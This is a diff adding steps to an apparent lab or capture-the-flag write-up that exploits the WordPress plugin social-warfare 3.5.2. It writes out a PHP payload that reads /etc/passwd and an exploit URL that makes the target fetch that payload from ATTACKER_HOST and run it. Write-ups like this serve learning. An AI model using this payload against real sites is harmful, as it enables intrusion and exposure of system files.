@@ -139,6 +139,23 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221018221533.png)
 
+![](Pasted%20image%2020221018221609.png)
+
+
+#### -Ran WPScan and found the following showing plugin "social-warfare version 3.5.2": 
+
+![](Pasted%20image%2020221018221708.png)
+
+#### -Googled "social-warfare 3.5.2 exploit" and found the following ling and navigate to the web page and followed the steps: 
+![](Pasted%20image%2020221018221940.png)
+![](Pasted%20image%2020221018221808.png)
+
+#### -Made a payload.txt file with the script "<pre>system('cat /etc/passwd')</pre>" inside
+
+#### -Setup a http server to host the payload txt file with "payload.txt"
+
+#### -Input http://WEBSITE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt instead of listed http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt as shown in the wpscan exploit showing previously as the previous weblogin page started with "/wordpress/" directory shown below and received the following webpage finding the user "takis":  
+
 
 
 ---
